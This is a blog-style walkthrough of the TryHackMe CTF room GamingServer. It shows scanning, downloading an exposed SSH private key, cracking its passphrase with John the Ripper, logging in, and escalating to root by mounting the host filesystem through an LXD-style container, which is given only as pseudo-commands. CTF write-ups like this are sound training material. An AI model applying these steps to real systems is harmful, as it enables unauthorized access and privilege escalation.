---
title: "Gaming Server — TryHackMe CTF Walkthrough"
author: shivam
date: 2025-10-14
categories: [ctf, tryhackme, writeup]
tags: [TryHackMe, GamingServer, boot2root, writeup, walkthrough]
summary: "Boot2Root walkthrough for the TryHackMe room *GamingServer* — enumeration, exploitation and privilege escalation (completed 14-10-2025)."
image:
  path: /assets/img/gaming_server/1759729999480.jpg
  alt: "GamingServer TryHackMe room"
---

# GamingServer — TryHackMe (Walkthrough)

**Completed by:** Shivam Pakade  
**Completed on:** 14-10-2025  
**Difficulty:** Easy — Boot2Root (Web ≫ PrivEsc).  
**Room:** GamingServer (TryHackMe)

---

## Short summary / objective

A beginner Boot2Root covering web enumeration, discovery of an exposed private key / secret, cracking that key with a provided dictionary, SSH access as a low-privilege user, and an LXD-style privilege escalation to root via a misconfigured deployment/container mechanism. This walkthrough documents the commands I ran and the key findings.

---

## Table of contents

1. [Recon & Scanning](#recon--scanning)  
2. [Web Enumeration](#web-enumeration)  
3. [Finding the private key & cracking it](#finding-the-private-key--cracking-it)  
4. [Initial access (SSH)](#initial-access-ssh)  
5. [Privilege escalation (LXD / deployment)](#privilege-escalation-lxd--deployment)  
6. [Root flag & final proof](#root-flag--final-proof)  
7. [Lessons learned & resources](#lessons-learned--resources)

---

## Recon & Scanning

Start by deploying the machine in TryHackMe and run a basic port scan (nmap / rustscan):

```bash
# example nmap
nmap -Pn -sV -p- -T4 $IP -oN nmap_full.txt

# or faster scan for known ports
nmap -Pn -sV -p22,80 $IP -oN nmap_quick.txt
````

Typical result for this room: **ports 80 (HTTP) and 22 (SSH)** are open.

---

## Web enumeration

1. Open the web page at `http://$IP/` and inspect the site. Look for pages, `robots.txt` and any obvious links (e.g. `/uploads`, `/secret`, `/about`). Use a directory brute force if needed:

```bash
gobuster dir -u http://$IP -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,old
```

2. You should find:

* `/uploads/` (an uploads directory containing files)
* `/secret/` (file(s) such as `secretKey`)
* possibly `robots.txt` referencing the uploads/secret paths

These pages often contain a file named `secretKey` which, when downloaded, looks like an SSH private key.


![Uploads directory screenshot]({{ "/assets/img/gaming_server/1759730005732.jpg" | relative_url }})

---

## Finding the private key & cracking it

1. Download the `secretKey` file:

```bash
curl -L http://$IP/secret/secretKey -o id_rsa
chmod 600 id_rsa
```

2. Convert the private key to a John the Ripper hash and crack it using the provided dictionary from `/uploads` (the room often stores a `.list`/dictionary file):

```bash
ssh2john id_rsa > id_rsa.hash
john --wordlist=dict.list id_rsa.hash
```

When John cracks it you will get the passphrase for the SSH private key (often a simple password like `letmein` in example screenshots).



![john cracked password output]({{ "/assets/img/gaming_server/1759730006117.jpg" | relative_url }})

---

## Initial access (SSH)

With the cracked private key and its passphrase, SSH into the server as the discovered user (commonly `john`, `danak`, or similar — use whichever username is found on the site or in the page source):

```bash
ssh -i id_rsa user@$IP
# or ssh -i id_rsa -o "IdentitiesOnly=yes" user@$IP
```

Once on the box, enumerate: `id`, `whoami`, `hostname`, `ls -la`, `ps aux`, `sudo -l`, and check `~` for user flag.


![user shell and user flag]({{ "/assets/img/gaming_server/1759730005732.jpg" | relative_url }})

---

## Privilege escalation (LXD / deployment)

This room features an insecure deployment / LXD-like system that allows privilege escalation:

1. Enumerate sudo privileges and locate the deployment binary or service. Look for a script or service that allows creating devices/containers or a binary owned by root but writable by you.

2. Common exploitation approach:

* You find a deployer or script that can write devices (e.g. `giveMeRoot` device or similar).
* Use the deployment mechanism to create a device or container that mounts the host filesystem (e.g. bind `/` into the container).
* From the mounted host root, access `/root/root.txt` or add your own SSH key to `/root/.ssh/authorized_keys`.

Example (high level):

```bash
# from the target machine (pseudo-commands)
# 1. use the deployment tool to create a device called giveMeRoot (the room demonstrates this)
# 2. mount host / to /mnt/root/root
cd /mnt/root/root
ls
cat root.txt
```


![LXD privesc / device added screenshot]({{ "/assets/img/gaming_server/1759730003452.jpg" | relative_url }})

---

## Root flag & final proof

After mounting the host root (or otherwise escalating), list `/mnt/root/root` and view `root.txt`:

```bash
cd /mnt/root/root
ls -la
cat root.txt
```


![root flag found]({{ "/assets/img/gaming_server/1759729999480.jpg" | relative_url }})

---

## TL;DR — Commands used (summary)

```bash
# Recon
nmap -Pn -sV -p22,80 $IP

# Web enumeration
gobuster dir -u http://$IP -w /usr/share/wordlists/dirb/common.txt -x php,html,txt

# Download secretKey & dictionary
curl -L http://$IP/secret/secretKey -o id_rsa
curl -L http://$IP/uploads/dict.list -o dict.list

# Crack private key
ssh2john id_rsa > id_rsa.hash
john --wordlist=dict.list id_rsa.hash

# SSH in using cracked key
ssh -i id_rsa user@$IP

# On target: enumerate and find deployment/lxd mechanism
sudo -l
ps aux | grep deploy
# follow the room-specific deployment steps to create the device and mount host fs

# final: read root flag
cat /mnt/root/root/root.txt
```

---

## Lessons learned & resources

* Always check for hidden files and directories (`robots.txt`, `/uploads`, `/secret`).
* If a private key is exposed, look for a local dictionary on the server — rooms often intentionally include a wordlist. Cracking the key is often the quickest way to initial access.
* Misconfigured container/deployment systems (LXD-like) are a common escalation vector: if containers can mount the host filesystem or create devices, you can often pivot to host root.

---

